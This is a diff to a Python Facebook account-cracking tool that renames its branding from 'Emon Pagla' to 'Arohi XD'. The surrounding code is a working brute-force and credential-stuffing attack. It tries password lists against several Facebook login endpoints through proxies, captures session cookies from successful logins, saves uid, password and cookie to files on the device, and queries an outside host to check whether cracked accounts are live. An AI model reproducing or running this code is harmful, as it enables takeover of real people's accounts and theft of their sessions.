@@ -464,13 +464,18 @@ def linex():
 def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.06)
 logo =f'''
-\033[1;91m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;93m
+\033[1;91m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;91m
 
-╔═╗╦═╗╔═╗╦ ╦╦  ═╗ ╦╔╦╗
-╠═╣╠╦╝║ ║╠═╣║  ╔╩╦╝ ║║
-╩ ╩╩╚═╚═╝╩ ╩╩  ╩ ╚══╩╝
-            \x1b[37;41m\t 𝙒𝙚𝙡𝙡𝙘𝙖𝙢𝙚 𝙏𝙤 𝙀𝙢𝙤𝙣 𝙋𝙖𝙜𝙡𝘼 𝙏𝙤𝙤𝙡\x1b[0;m\n\n\x1b[1;37m                                                                                                                                            
-\033[1;91m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
+
+ █████╗ ██████╗  ██████╗ ██╗  ██╗██╗    ██╗  ██╗██████╗ 
+██╔══██╗██╔══██╗██╔═══██╗██║  ██║██║    ╚██╗██╔╝██╔══██╗
+███████║██████╔╝██║   ██║███████║██║     ╚███╔╝ ██║  ██║
+██╔══██║██╔══██╗██║   ██║██╔══██║██║     ██╔██╗ ██║  ██║
+██║  ██║██║  ██║╚██████╔╝██║  ██║██║    ██╔╝ ██╗██████╔╝
+╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝    ╚═╝  ╚═╝╚═════╝ 
+                                                        
+      \x1b[37;41m\t 𝙒𝙚𝙡𝙡𝙘𝙖𝙢𝙚 𝙏𝙤 𝙀𝙢𝙤𝙣 𝙋𝙖𝙜𝙡𝘼 𝙏𝙤𝙤𝙡\x1b[0;m\n\n\x1b[1;37m                                                                                                                                            
+\033[1;91m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               
   \033[1;91m═══════════════════════════════════════════════════
 \033[1;32m • DEVLOPER EMON
  • TOOL TYPE : RANDOM-FILE-OLD
@@ -823,18 +828,18 @@ def login(uid):
             "x-fb-http-engine": "Liger"}
             rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers, proxies=max).json()
             if "session_key" in rp:
-                print(f"\r\r [EMON PAGLA 🍬OK-ID] {uid} • {pw}")
-                open("/sdcard/Emon-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                print(f"\r\r [Arohi XD🍬OK-ID] {uid} • {pw}")
+                open("/sdcard/Arohi🌺-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break 
             elif "www.facebook.com" in rp["error_msg"]:
                 print(f"\r\r {RED}[CP-ID] {uid} • {pw}")
-                open("/sdcard/EmonN-OLD-CP.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/Arohi-OLD-CP.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             elif "Please Confirm Email" in str(rp):
                 print(f"\r\r {pink}[VERIFICATION-NEED] {uid} • {pw}")
-                open("/sdcard/Emon-OLD-2F.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/Arohi-OLD-2F.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -891,7 +896,7 @@ def crack(idf, pwv):
             q = json.loads(response_text)
             
             if "checkpoint" in q:
-                print(f'\r\x1b[1;96m[Emon😭-CP] \x1b[38;5;205m {idf} | {pw}')
+                print(f'\r\x1b[1;96m[Arohi-CP] \x1b[38;5;205m {idf} | {pw}')
                 with open('/sdcard/-FILE-CP.txt', 'a') as file:
                     file.write(f'{idf} • {pw}\n')
                 cps.append(idf)
@@ -901,8 +906,8 @@ def crack(idf, pwv):
                 ok += 1
                 cookies = ses.cookies.get_dict()
                 cookie_string = ";".join([f"{key}={value}" for key, value in cookies.items()])
-                print(f'\r\x1b[1;96m[Emon🔥-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{cookie_string} ')
-                with open('/sdcard/Emon-FILE-M1-OK.txt', 'a') as file:
+                print(f'\r\x1b[1;96m[Arohi🔥-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{cookie_string} ')
+                with open('/sdcard/Arohi-FILE-M1-OK.txt', 'a') as file:
                     file.write(f'{idf} • {pw}\n[COOKIES] ● {cookie_string}\n')
                 oks.append(idf)
                 break
@@ -968,7 +973,7 @@ def crackfree(idf, pwv):
             p = requests.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers, proxies=max_proxy, allow_redirects=False).text
             q = json.loads(p)
             if "checkpoint" in q:
-                print(f'\r\x1b[1;96m[Emon-CP] \x1b[38;5;205m {idf} | {pw}')
+                print(f'\r\x1b[1;96m[Arohi-CP] \x1b[38;5;205m {idf} | {pw}')
                 with open('/sdcard/x-FILE-CP.txt', 'a') as file:
                     file.write(f'{idf} • {pw}\n')
                 cps.append(idf)
@@ -978,8 +983,8 @@ def crackfree(idf, pwv):
                 ok += 1
                 coki = ses.cookies.get_dict()
                 kuki = ";".join([f"{key}={value}" for key, value in coki.items()])
-                print(f'\r\x1b[1;96m[Emon🔥-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
-                with open('/sdcard/Emon-FILE-M2-OK.txt', 'a') as file:
+                print(f'\r\x1b[1;96m[Arohi🔥-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
+                with open('/sdcard/Arohi-FILE-M2-OK.txt', 'a') as file:
                     file.write(f'{idf} • {pw}\n[COOKIES] ● {kuki}\n')
                 oks.append(idf)
                 break
@@ -1127,7 +1132,7 @@ def crackhost(idf, pwv):
             po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
             if 'checkpoint' in po.cookies.get_dict().keys():
                 cp += 1
-                print(f'\r\x1b[1;96m[Emon-CP] \x1b[38;5;205m {idf} | {pw}')
+                print(f'\r\x1b[1;96m[Arohi-CP] \x1b[38;5;205m {idf} | {pw}')
                 with open('/sdcard/X-FILE-CP.txt', 'a') as file:
                     file.write(f'{idf} • {pw}\n')
                 cp.append(idf)
@@ -1136,7 +1141,7 @@ def crackhost(idf, pwv):
                 ok += 1
                 coki = po.cookies.get_dict()
                 kuki = '; '.join([f'{key}={value}' for key, value in ses.cookies.get_dict().items()])
-                print(f'\r\x1b[1;96m[Emon🔥-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
+                print(f'\r\x1b[1;96m[Arohi🌺-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
                 linex()
                 with open('/sdcard/Emon-FILE-M4-OK.txt', 'a') as file:
                     file.write(f'{idf} • {pw}\n[COOKIES] ● {kuki}\n')
@@ -1158,7 +1163,7 @@ def rndm1(uid, passlist):
     global proxy
     global ugen
     bo = random.choice([m, k, h, b, u, x])
-    sys.stdout.write(f'\r\r{B}[{G} EMON PAGLA 🍬-M1{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
+    sys.stdout.write(f'\r\r{B}[{G} Arohi XD 🍬-M1{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
     sys.stdout.flush()
     try:
         for pas in passlist:
@@ -1224,13 +1229,13 @@ def rndm1(uid, passlist):
                 coki = ';'.join([f"{i['name']}={i['value']}" for i in po['session_cookies']])
                 res = requests.get(f'https://rajx.pythonanywhere.com/live?uid={uid}').text
                 if res == 'LIVE':
-                    print(f'\r\x1b[1;92m[Emon 🔥-OK] {uid} | {pas}')
+                    print(f'\r\x1b[1;92m[Arohi🌺-OK] {uid} | {pas}')
                     print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} " + coki)
-                    with open('/sdcard/Emon-RNDM-OK.txt', 'a') as f:
+                    with open('/sdcard/Arohi-OK.txt', 'a') as f:
                         f.write(f'{uid}|{pas}|{coki}\n')
                     oks.append(uid)
                 elif res == 'LOCK':
-                    print(f'\r\x1b[1;31;40m|SHAJON-S1-LOCK| {uid} | {pas}')
+                    print(f'\r\x1b[1;31;40m|Arohi🤬-S1-LOCK| {uid} | {pas}')
             elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                 print(f'\r\r{B}[{Y}CP{B}]{Y} ' + uid + ' | ' + pas + '\033[1;97m')
                 with open('/sdcard/-S1-CP.txt', 'a') as f:
@@ -1249,7 +1254,7 @@ def rndm2(uid, passlist):
     global cps
     global proxy
     bo = random.choice([m, k, h, b, u, x])
-    sys.stdout.write(f'\r\r{B}[{G}EMON PAGLA 🍬-M2{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
+    sys.stdout.write(f'\r\r{B}[{G}Arohi XD-M2{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
     sys.stdout.flush()
     try:
         for pas in passlist:
@@ -1312,13 +1317,13 @@ def rndm2(uid, passlist):
                 coki = ';'.join([f"{i['name']}={i['value']}" for i in po['session_cookies']])
                 res = requests.get(f'https://rajx.pythonanywhere.com/live?uid={uid}').text
                 if res == 'LIVE':
-                    print(f'\r\x1b[1;92m[Emon🔥OK] {uid} | {pas}')
+                    print(f'\r\x1b[1;92m[Arohi🌺OK] {uid} | {pas}')
                     print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} " + coki)
-                    with open('/sdcard/Emon-RNDM-OK.txt', 'a') as f:
+                    with open('/sdcard/Arohi-OK.txt', 'a') as f:
                         f.write(f'{uid}|{pas}|{coki}\n')
                     oks.append(uid)
                 elif res == 'LOCK':
-                    print(f'\r\x1b[1;31;40m|E-S2-LOCK| {uid} | {pas}')
+                    print(f'\r\x1b[1;31;40m|Arohi S2-LOCK| {uid} | {pas}')
             elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                 print(f'\r\r{B}[{Y}-CP{B}]{Y} ' + uid + ' | ' + pas + '\033[1;97m')
                 with open('/sdcard/-S2-CP.txt', 'a') as f:
@@ -1345,7 +1350,7 @@ def rndm3(uid, passlist):
             uax = random.choice(uadef)
             session = requests.Session()
             bo = random.choice([m, k, h, b, u, x])
-            sys.stdout.write(f'\r\r[{G}EMON PAGLA 🍬-M3{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
+            sys.stdout.write(f'\r\r[{G}Arohi XD🍬-M3{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
             sys.stdout.flush()
             fb = "m"
             free_fb = session.get(f'https://{fb}.facebook.com').text
@@ -1393,24 +1398,24 @@ def rndm3(uid, passlist):
                 ckk = f'https://rajx.pythonanywhere.com/live?uid={uid}'
                 res = requests.get(ckk).text
                 if res == 'LIVE':
-                    print(f'\r\x1b[1;92m[EmoN🔥-OK] {uid} | {pas}')
+                    print(f'\r\x1b[1;92m[Arohi🌺-OK] {uid} | {pas}')
                     print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} sb={sort} ")
-                    with open('/sdcard/emon--𝙰𝙲𝚃𝙸𝚅𝙴😍❤️.txt', 'a') as f:
+                    with open('/sdcard/emon--𝙰𝙲𝚃𝙸𝚅𝙴.txt', 'a') as f:
                         f.write(uid + ' • ' + pas + ' • [COOKIE] ' + coki + ' \n')
                     oks.append(uid)
                 elif res == 'LOCK':
-                    print(f'\r\x1b[1;35;40m|Emon-S4-LOCK| {uid} | {pas}')
+                    print(f'\r\x1b[1;35;40m|Arohi-S4-LOCK| {uid} | {pas}')
                     print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} sb={sort} ")
                 break
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in lo:
                     print(f'\r\033[38;5;45m[Emon-𝟸𝙵] {uid} [💙] {pas} ')
-                    with open('/sdcard/-𝟸𝙵💙.txt', 'a') as f:
+                    with open('/sdcard/-𝟸𝙵.txt', 'a') as f:
                         f.write(uid + ' | ' + pas + '\n')
                     cps.append(uid)
                 else:
                     print(f'\r\033[1;30m[Emon--CP] {uid} [💔] {pas} ')
-                    with open('/sdcard/--𝙲𝙿💔.txt', 'a') as f:
+                    with open('/sdcard/--𝙲𝙿.txt', 'a') as f:
                         f.write(uid + ' | ' + pas + '\n')
                     cps.append(uid)
                 break
@@ -1424,7 +1429,7 @@ def rndm3(uid, passlist):
 #______________#
 """def rndm3(uid, passlist):
     global oks, cps, ugen, loop
-    sys.stdout.write(f'\r\r[{G}EMON PAGLA 🍬-M3{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
+    sys.stdout.write(f'\r\r[{G}Arohi XD🍬-M3{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
     sys.stdout.flush()
     session = requests.Session()
     try:
@@ -1476,24 +1481,24 @@ def rndm3(uid, passlist):
                 ckk = f'https://rajx.pythonanywhere.com/live?uid={uid}'
                 res = requests.get(ckk).text
                 if res == 'LIVE':
-                    print(f'\r\x1b[1;92m[Emon🔥-OK] {uid} | {pas}')
+                    print(f'\r\x1b[1;92m[Arohi🌺-OK] {uid} | {pas}')
                     print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} sb={sort} ")
-                    with open('/sdcard/Emon🔥--𝙰𝙲𝚃𝙸𝚅𝙴😍❤️.txt', 'a') as f:
+                    with open('/sdcard/Arohi.txt', 'a') as f:
                         f.write(uid + ' • ' + pas + ' • [COOKIE] ' + coki + ' \n')
                     oks.append(uid)
                 elif res == 'LOCK':
-                    print(f'\r\x1b[1;35;40m|Emon Pagla-S4-LOCK| {uid} | {pas}')
+                    print(f'\r\x1b[1;35;40m|Arohi-S4-LOCK| {uid} | {pas}')
                     print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} sb={sort} ")
                 break
             elif 'checkpoint' in shajonn:
                 if 'Enter login code to continue' in lo:
                     print(f'\r\033[38;5;45m[--𝟸𝙵] {uid} [💙] {pas} ')
-                    with open('/sdcard/--𝟸𝙵💙.txt', 'a') as f:
+                    with open('/sdcard/--𝟸𝙵.txt', 'a') as f:
                         f.write(uid + ' | ' + pas + '\n')
                     cps.append(uid)
                 else:
                     print(f'\r\033[1;30m[Emon--CP] {uid} | {pas} ')
-                    with open('/sdcard/--𝙲𝙿🥺💔.txt', 'a') as f:
+                    with open('/sdcard/Arohi.txt', 'a') as f:
                         f.write(uid + ' | ' + pas + '\n')
                     cps.append(uid)
                 break
@@ -1519,7 +1524,7 @@ def rndm4(uid, passlist):
             uax = random.choice(uadef)
             session = requests.Session()
             bo = random.choice([m, k, h, b, u, x])
-            sys.stdout.write(f'\r\r[{G}EMON PAGLA 🍬-M4{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
+            sys.stdout.write(f'\r\r[{G}Arohi XD🍬-M4{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
             sys.stdout.flush()
             free_fb = session.get('https://web.facebook.com').text
             log_data = {
@@ -1558,24 +1563,24 @@ def rndm4(uid, passlist):
                 ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if res == 'LIVE':
-                    print(f'\r\x1b[1;92m[SHAJON-OK] {uid} | {pas}')
+                    print(f'\r\x1b[1;92m[Arohi🌺-OK] {uid} | {pas}')
                     print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} " + coki)
-                    with open('/sdcard/Emon🔥--𝙰𝙲𝚃𝙸𝚅𝙴😍❤️.txt', 'a') as f:
+                    with open('/sdcard/Arohi.txt', 'a') as f:
                         f.write(uid + ' • ' + pas + ' • [COOKIE] ' + coki + ' \n')
                     oks.append(uid)
                 elif res == 'LOCK':
-                    print(f'\r\x1b[1;35;40m|Emon Pagla-S4-LOCK| {uid} | {pas}')
+                    print(f'\r\x1b[1;35;40m|Arohi-S4-LOCK| {uid} | {pas}')
                     print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} " + coki)
                 break
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in lo:
                     print(f'\r\033[38;5;45m[P--𝟸𝙵] {uid} [💙] {pas} ')
-                    with open('/sdcard/P--𝟸𝙵💙.txt', 'a') as f:
+                    with open('/sdcard/P--𝟸𝙵.txt', 'a') as f:
                         f.write(uid + ' | ' + pas + '\n')
                     cps.append(uid)
                 else:
                     print(f'\r\033[1;30m[c--CP] {uid} [💔] {pas} ')
-                    with open('/sdcard/--𝙲𝙿🥺💔.txt', 'a') as f:
+                    with open('/sdcard/--𝙲𝙿.txt', 'a') as f:
                         f.write(uid + ' | ' + pas + '\n')
                     cps.append(uid)
                 break
@@ -1600,7 +1605,7 @@ def rndm5(uid, passlist):
             uax = random.choice(uadef)
             session = requests.Session()
             bo = random.choice([m, k, h, b, u, x])
-            sys.stdout.write(f'\r\r[{G}EMON PAGLA 🍬-M5{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
+            sys.stdout.write(f'\r\r[{G}Arohi XD🍬-M5{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
             sys.stdout.flush()
             free_fb = session.get('https://p.facebook.com').text
             log_data = {
@@ -1646,9 +1651,9 @@ def rndm5(uid, passlist):
                 ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if res == 'LIVE':
-                    print(f'\r\x1b[1;92m[EMON🔥-OK] {uid} | {pas}')
+                    print(f'\r\x1b[1;92m[Arohi🔥-OK] {uid} | {pas}')
                     print(f"\r\r{Y}❲{G}COOKIE{Y}❳ {G2}●{X1} " + coki)
-                    with open('/sdcard/EMON PAGLA--𝙰𝙲𝚃𝙸𝚅𝙴😍❤️.txt', 'a') as f:
+                    with open('/sdcard/Arohi.txt', 'a') as f:
                         f.write(uid + ' • ' + pas + ' • [COOKIE] ' + coki + ' \n')
                     oks.append(uid)
                 elif res == 'LOCK':
@@ -1657,13 +1662,13 @@ def rndm5(uid, passlist):
                 break
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in lo:
-                    print(f'\r\033[38;5;45m[P--𝟸𝙵] {uid} [💙] {pas} ')
-                    with open('/sdcard/P--𝟸𝙵💙.txt', 'a') as f:
+                    print(f'\r\033[38;5;45m[x𝟸𝙵] {uid} [💙] {pas} ')
+                    with open('/sdcard/P--𝟸𝙵.txt', 'a') as f:
                         f.write(uid + ' | ' + pas + '\n')
                     cps.append(uid)
                 else:
-                    print(f'\r\033[1;30m[P--CP] {uid} [💔] {pas} ')
-                    with open('/sdcard/P-𝙲𝙿🥺💔.txt', 'a') as f:
+                    print(f'\r\033[1;30m[x-cp] {uid} [💔] {pas} ')
+                    with open('/sdcard/x-𝙲𝙿.txt', 'a') as f:
                         f.write(uid + ' | ' + pas + '\n')
                     cps.append(uid)
                 break
